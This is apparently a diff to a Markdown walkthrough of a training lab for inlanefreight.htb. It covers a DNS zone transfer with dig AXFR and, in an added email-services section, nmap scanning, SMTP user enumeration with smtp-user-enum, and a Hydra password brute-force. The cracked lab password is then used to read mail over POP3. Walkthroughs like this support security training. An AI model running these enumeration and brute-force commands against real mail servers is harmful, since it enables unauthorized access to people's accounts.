@@ -309,7 +309,8 @@ Once connected, I found the flag on the Desktop.
 
 ## Attacking DNS 
 * **Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.**
-The hint for this question suggested using Subbrute, so I proceeded to download it with the following command:
+  
+*The hint for this question suggested using Subbrute,* so I proceeded to download it with the following command:
 
 ```bash
 git clone https://github.com/TheRook/subbrute.git
@@ -337,3 +338,60 @@ dig AXFR @10.129.75.96 hr.inlanefreight.htb
 The transfer was successful, revealing the following records:
 
 [![Screenshot-2025-02-26-145648.png](https://i.postimg.cc/pX3QChhW/Screenshot-2025-02-26-145648.png)](https://postimg.cc/8jBrPCm9)
+
+## Attacking Email Services
+
+* **What is the available username for the domain inlanefreight.htb in the SMTP server?**
+  
+To answer this question, I conducted an Nmap scan using the following command:
+
+```bash
+sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.80.212
+```
+
+This scan helped identify the available mail services and their configurations on the target system.
+
+[![Screenshot-2025-02-26-151415.png](https://i.postimg.cc/Z5Kvz69F/Screenshot-2025-02-26-151415.png)](https://postimg.cc/D8HwqJP8)
+
+Next, I used smtp-user-enum to enumerate valid email users on the target system with the following command:
+
+```bash
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.80.212
+```
+
+[![Screenshot-2025-02-26-151658.png](https://i.postimg.cc/g2JjTd5g/Screenshot-2025-02-26-151658.png)](https://postimg.cc/zVsqLmqh)
+
+This helped me identify the username. 
+
+* **Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.**
+
+I attempted a brute-force attack on the SMTP service using Hydra with the following command:
+
+```bash
+hydra -l marlin@inlanefreight.htb -P pws.list -s 25 -f 10.129.80.212 smtp
+```
+[![Screenshot-2025-02-26-152058.png](https://i.postimg.cc/MTx8gmHz/Screenshot-2025-02-26-152058.png)](https://postimg.cc/bG6Mtb15)
+
+I then connected to the POP3 service on the target machine using Telnet with the following command:
+
+```bash
+telnet 10.129.80.212 110
+```
+
+Once connected, I logged in as marlin@inlanefreight.htb and provided the password poohbear. After logging in successfully, I listed the available messages using the LIST command, which showed one message of 601 octets. I then retrieved the message with the RETR command.
+
+[![Screenshot-2025-02-26-152709.png](https://i.postimg.cc/8c9XgT4L/Screenshot-2025-02-26-152709.png)](https://postimg.cc/5Q5SwdZt)
+
+The retrieved email contained the following details:
+
+From: marlin@inlanefreight.htb
+
+To: administrator@inlanefreight.htb
+
+Subject: Password change
+
+Date: Wed, 20 Apr 2022
+
+Body:
+
+[![Screenshot-2025-02-26-152532.png](https://i.postimg.cc/GpCNphCQ/Screenshot-2025-02-26-152532.png)](https://postimg.cc/VJK4Gw5r)
